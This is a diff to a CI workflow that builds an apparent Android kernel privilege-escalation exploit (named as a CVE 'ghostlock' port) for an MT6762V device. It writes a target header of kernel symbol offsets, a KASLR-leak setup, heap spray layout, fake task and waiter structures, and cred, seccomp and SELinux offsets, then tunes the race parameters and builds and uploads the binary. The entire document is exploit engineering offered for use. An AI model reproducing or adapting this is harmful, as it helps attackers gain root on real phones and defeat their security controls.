@@ -1,4 +1,4 @@
-name: build_k40_port_m36_final
+name: build_k40_port_m36_final_v2
 on: [push, workflow_dispatch]
 
 jobs:
@@ -24,11 +24,15 @@ jobs:
           git clone https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40.git
           cd ghostlock-cve-2026-43499-4.19-k40
 
-      - name: Patch target.h with M36 (MT6762V) addresses
+      - name: OVERWRITE target.h (force)
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
+          TARGET_FILE="src/targets/oplus-4.19.157-perf/target.h"
           
-          cat << 'EOF' > src/targets/oplus-4.19.157-perf/target.h
+          # Save original for reference
+          cp "$TARGET_FILE" /tmp/k40_target.h.bak
+          
+          cat > "$TARGET_FILE" << 'EOF'
           #ifndef TARGET_H
           #define TARGET_H
 
@@ -37,7 +41,6 @@ jobs:
           #define BUILD_FINGERPRINT "alps/m36/unknown:13/xxx/xxx:user/release-keys"
           #endif
 
-          /* ---------------- address space ---------------- */
           #define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
           #define P0_PAGE_OFFSET 0xffffff8000000000ULL
           #define P0_PHYS_OFFSET 0x40000000ULL
@@ -49,8 +52,6 @@ jobs:
           #define VMEMMAP_START 0xffffffbc00000000ULL
 
           #define PSELECT_WAITER_WORD_SHIFT 1
-
-          /* ---------------- adaptation switches ---------------- */
           #define CFGOPS_4_19_STYLE 1
           #define KMALLOC_419 1
           #define KMALLOC_PIPE_INDEX 10
@@ -60,7 +61,6 @@ jobs:
           #define ASHMEM_PREFIX_COUNT 0
           #define MM_STRUCT_SZ 0x340
 
-          /* ---------------- symbol offsets (M36 MT6762V) ---------------- */
           #define ASHMEM_MISC_FOPS_OFF 0x0180ab58ULL
           #define ASHMEM_FOPS_OFF 0x01067d80ULL
           #define ASHMEM_IOCTL_OFF 0x00ac0d84ULL
@@ -103,7 +103,6 @@ jobs:
           #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
           #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 
-          /* ---------------- KASLR-leak ---------------- */
           #define SLIDE_NFULNL_LOGGER_OFF 0x016f1860ULL
           #define SLIDE_SYSCTL_BOOTID_OFF 0x019320e4ULL
           #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
@@ -119,7 +118,6 @@ jobs:
           #define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
           #define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
-          /* ---------------- exploit-internal spray layout ---------------- */
           #define LOCK_OFF 0x1350
           #define W0_OFF 0x2220
           #define FOPS_OFF 0x1000
@@ -128,7 +126,6 @@ jobs:
           #define LEFT_OFF 0x5550
           #define FAKE_TASK_OFF 0x3200
 
-          /* ---------------- rt_mutex_waiter (4.19) ---------------- */
           #define WAITER_LOCAL_OFF 0x80
           #define WAITER_TREE_ENTRY_OFF 0x00
           #define WAITER_PI_TREE_ENTRY_OFF 0x18
@@ -147,7 +144,6 @@ jobs:
           #define FAKE_WAITER_WAKE_STATE_OFF 0x60
           #define FAKE_WAITER_WW_CTX_OFF 0x68
 
-          /* ---------------- task_struct (M36 - real_cred 0x758, cred 0x760) ---------------- */
           #define FAKE_TASK_USAGE_OFF 0x68
           #define FAKE_TASK_PRIO_OFF 0xac
           #define FAKE_TASK_NORMAL_PRIO_OFF 0xb4
@@ -175,14 +171,12 @@ jobs:
           #define TASK_THREAD_INFO_FLAGS_OFF 0x00
           #define TASK_SECCOMP_OFF 0x848
 
-          /* ---------------- configfs_buffer (4.19) ---------------- */
           #define CFG_PAGE_OFF 16
           #define CFG_NEEDS_READ_FILL_OFF 64
           #define CFG_BIN_BUFFER_OFF 72
           #define CFG_BIN_BUFFER_SIZE_OFF 80
           #define CFG_CB_MAX_SIZE_OFF 84
 
-          /* ---------------- cred / seccomp / selinux ---------------- */
           #define CRED_UID_OFF 4
           #define CRED_SECUREBITS_OFF 36
           #define CRED_CAPS_OFF 40
@@ -195,13 +189,11 @@ jobs:
           #define TIF_SECCOMP_BIT 11
           #define PFA_NO_NEW_PRIVS_BIT 0
 
-          /* ---------------- struct page ---------------- */
           #define STRUCT_PAGE_SIZE 0x40
           #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
           #define STRUCT_SLAB_CACHE_OFF 0x18
           #define STRUCT_PAGE_TYPE_OFF 0x30
 
-          /* ---------------- pipe (LEGACY 4.19) ---------------- */
           #define PIPE_BUFFER_SIZE 0x28
           #define PIPE_BUFFER_SLOTS 16
           #define PIPE_BUF_FLAG_CAN_MERGE 0x10
@@ -217,7 +209,6 @@ jobs:
           #define PIPE_BUFS_OFF 0x78
           #define PIPE_USER_OFF 0x80
 
-          /* ---------------- file_operations (4.19) ---------------- */
           #define FOPS_OWNER_OFF 0x00
           #define FOPS_LLSEEK_OFF 0x08
           #define FOPS_READ_OFF 0x10
@@ -234,9 +225,31 @@ jobs:
 
           #endif
           EOF
+          
+          echo "=== Verification: check label ==="
+          grep "BUILD_VARIANT_LABEL" "$TARGET_FILE"
+          grep "P0_PHYS_OFFSET" "$TARGET_FILE"
+          grep "TASK_REAL_CRED_OFF" "$TARGET_FILE"
+          
+          echo "=== File size ==="
+          wc -l "$TARGET_FILE"
 
-          echo "=== target.h written, lines: ==="
-          wc -l src/targets/oplus-4.19.157-perf/target.h
+      - name: Patch CPU count and thread count
+        run: |
+          cd ghostlock-cve-2026-43499-4.19-k40
+          
+          # Fix CPU count from 16 to 8 (0-7)
+          sed -i 's/g_cpu_count = 16/g_cpu_count = 8/g' src/*.c src/*.h 2>/dev/null || true
+          sed -i 's/cpu_count = 16/cpu_count = 8/g' src/*.c src/*.h 2>/dev/null || true
+          
+          # Fix thread count from 8 to 7
+          sed -i 's/thread_cnt = 8/thread_cnt = 7/g' src/*.c src/*.h 2>/dev/null || true
+          
+          # Increase collisions from 4 to 16
+          sed -i 's/collisions = 4/collisions = 16/g' src/*.c src/*.h 2>/dev/null || true
+          
+          echo "=== Verification: greps ==="
+          grep -rn "cpu_count\|thread_cnt\|collisions" src/*.c src/*.h 2>/dev/null | grep -E "= (8|7|16)" | head -n 10
 
       - name: Build with NDK
         env:
@@ -252,5 +265,5 @@ jobs:
 
       - uses: actions/upload-artifact@v4
         with:
-          name: ghostlock-m36-port
+          name: ghostlock-m36-final
           path: /tmp/out/
